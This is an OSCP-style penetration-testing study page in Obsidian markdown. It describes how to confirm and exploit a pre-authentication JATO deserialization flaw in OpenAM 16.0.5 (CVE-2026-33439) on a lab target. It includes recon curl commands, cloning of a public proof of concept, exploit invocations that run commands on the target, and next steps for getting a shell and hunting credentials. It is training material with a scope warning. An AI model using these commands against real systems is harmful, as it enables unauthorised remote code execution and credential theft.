# Linux - OpenAM JATO Deserialization

**Step 10D of 50 · Linux/Web**

*Validate an OpenAM 16.0.5 pre-authentication JATO client-session deserialization path and turn command execution into a documented shell or application pivot.*

Fast syntax reference: [[OSCP COMMAND MASTER CHEATSHEET|OSCP Command Master Cheatsheet]] · Keep the endpoint, response proof, PoC source, and callback evidence here.

> [!warning] Scope
> Use this page only against an authorised lab or exam target. Start with a harmless identity command and keep the complete request, response, and PoC source in private evidence.

## When to use this page

Open this stage when a web or SSO service identifies OpenAM 16.0.5 and the application exposes the password-reset validation route used by the matching `jato.clientSession` deserialization proof of concept.

## Confirm the application and version

> **Why:** These requests confirm the virtual host and collect the OpenAM response before the PoC is selected.
```bash
curl -skI --resolve "sso.$Domain:443:$BoxIP" \
  "https://sso.$Domain/openam/ui/PWResetUserValidation"
curl -sk --resolve "sso.$Domain:443:$BoxIP" \
  "https://sso.$Domain/openam/" | tee "$BoxDir/loot/openam-root.html"
searchsploit OpenAM 16.0.5
```

## Copy and review the manual PoC

> **Why:** Keeping the original source and a local copy makes the request, payload format, and later edits reproducible.
```bash
git clone https://github.com/TheMalwareGuardian/CVE-2026-33439.git \
  "$BoxDir/exploits/cve-2026-33439"
cd "$BoxDir/exploits/cve-2026-33439"
python3 exploit.py --help
sed -n '1,260p' exploit.py
```

Do not skip the source review. Confirm the target URL, the `jato.clientSession` delivery mechanism, the command header, and the response parsing before sending a callback.

## Prove command execution

> **Why:** `id` is a low-impact response-channel proof. The returned account is the execution identity and determines whether local enumeration or an application pivot is more useful.
```bash
python3 exploit.py \
  --url "https://sso.$Domain/openam/ui/PWResetUserValidation" \
  'id'
```

Run the same proof with a small identity bundle after the first result is positive:

```bash
python3 exploit.py \
  --url "https://sso.$Domain/openam/ui/PWResetUserValidation" \
  'id; hostname; pwd; uname -a'
```

## What did you get?

- [ ] The response returns `uid=` and an OpenAM service identity → **Save the response, set `$Username` to the returned account, and go to Step 11 · [[Linux - RCE to Shell]]**
- [ ] The route returns a normal validation response but no command output → **Recheck the virtual host, endpoint, query-string payload, and command header; do not switch to a callback yet**
- [ ] The endpoint or version does not match → **Treat this PoC as a dead end and return to Step 5 · [[Linux - Web Enum]] or Step 10 · [[Linux - Exploit Search]]**
- [ ] Command execution is confirmed but the service account is restricted → **Go to Step 13 · [[Linux - Local Enum]] and Step 17 · [[Linux - Credential Search]]; inspect application configuration before repeating generic kernel checks**

## Gotchas

> [!warning] A scanner result is not execution proof
> An older OpenAM candidate or a Java error response does not prove the target accepts the same request. Match the endpoint, method, payload carrier, and version.

> [!warning] Keep the delivery mechanism intact
> The working proof depends on the `jato.clientSession` query value and the command header. Changing only one part can produce an error that looks like a failed vulnerability.

> [!warning] Prove before callback
> A callback failure after `id` succeeds is a listener, route, egress, or quoting issue. Preserve the positive response and troubleshoot the transport separately.

## Related application pivot

If the OpenAM account can read another installed application's configuration, save the file privately and inspect it for database connection details, application keys, encrypted fields, and local account reuse. Route the result to [[Linux - Credential Search]] and [[Linux - Database Access]], not directly to a broad password spray.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- OpenAM 16.0.5 pre-authentication JATO deserialization gave command execution as `openam`

## Related stages

- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]
- [[Linux - RCE to Shell]]
- [[Linux - Local Enum]]
- [[Linux - Credential Search]]
- [[Linux - Clean Down]]

## External Resources

- [TheMalwareGuardian CVE-2026-33439 PoC](https://github.com/TheMalwareGuardian/CVE-2026-33439)
- [OpenAM project](https://github.com/OpenIdentityPlatform/OpenAM)

## Why this matters for OSCP

This page reinforces a transferable exploit habit: confirm the exact product and endpoint, review the source, prove low-impact execution, and pivot through readable application configuration when the service account itself is not privileged.
